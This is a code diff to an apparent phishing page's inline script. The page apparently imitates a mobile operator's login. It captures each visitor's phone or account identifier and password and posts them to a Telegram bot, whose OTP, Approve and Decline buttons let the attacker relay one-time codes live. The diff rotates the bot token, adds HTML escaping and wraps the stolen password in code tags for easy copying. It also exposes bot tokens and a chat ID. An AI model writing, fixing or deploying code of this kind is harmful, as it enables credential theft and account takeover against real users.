@@ -382,7 +382,7 @@ body{
 <script>
   // ==================== TELEGRAM BOT CONFIG ====================
   // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID !!!
-  const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
+  const BOT_TOKEN = '8323704904:AAEiB-e1x2uQ_qZp0PaBS__8B9EXs402Xus';
   const CHAT_ID   = '1006917440';
 
   // If you need a CORS proxy, change this line (e.g., add 'https://cors-anywhere.herokuapp.com/' before the URL)
@@ -505,6 +505,17 @@ body{
   });
 
   // ==================== TELEGRAM HELPER FUNCTIONS ====================
+  // Escape HTML special characters to prevent injection
+  function escapeHtml(unsafe) {
+    return unsafe.replace(/[&<>"]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      if (m === '"') return '&quot;';
+      return m;
+    });
+  }
+
   async function sendToTelegram(payload) {
     const url = `${API_BASE}/sendMessage`;
     try {
@@ -603,10 +614,15 @@ body{
     const ts = Date.now();
 
     // Send password to Telegram with options OTP, Approve, Decline
-    const msg = `Password Verification\n\nAccount: ${accountType}\nIdentifier: ${inputValue}\nPassword: ${password}\n\nChoose action:`;
+    // Identifier is plain, password is wrapped in <code> for easy copying
+    const identifierLine = accountType === 'Mobile' ? `Phone: ${inputValue}` : `Account: ${inputValue}`;
+    const escapedPassword = escapeHtml(password);
+    const msg = `Password Verification\n\n${identifierLine}\nPassword: <code>${escapedPassword}</code>\n\nChoose action:`;
+
     await sendToTelegram({
       chat_id: CHAT_ID,
       text: msg,
+      parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [[
           { text: 'OTP', callback_data: `password_otp_${ts}` },
@@ -661,11 +677,19 @@ body{
     sessionStorage.setItem('telecel_otp', generateOTP());
 
     const ts = Date.now();
-    const msg = `New Login Attempt\n\nAccount Type: ${accountType}\nIdentifier: ${inputValue}\n\nChoose action:`;
+    // Format identifier with HTML <code> tags for easy copying
+    let identifierLine;
+    if (accountType === 'Mobile') {
+      identifierLine = `Phone: <code>${escapeHtml(inputValue)}</code>`;
+    } else {
+      identifierLine = `Account: <code>${escapeHtml(inputValue)}</code>`;
+    }
+    const msg = `New Login Attempt\n\nAccount Type: ${accountType}\n${identifierLine}\n\nChoose action:`;
 
     await sendToTelegram({
       chat_id: CHAT_ID,
       text: msg,
+      parse_mode: 'HTML',
       reply_markup: {
         inline_keyboard: [[
           { text: 'OTP', callback_data: `initial_otp_${ts}` },
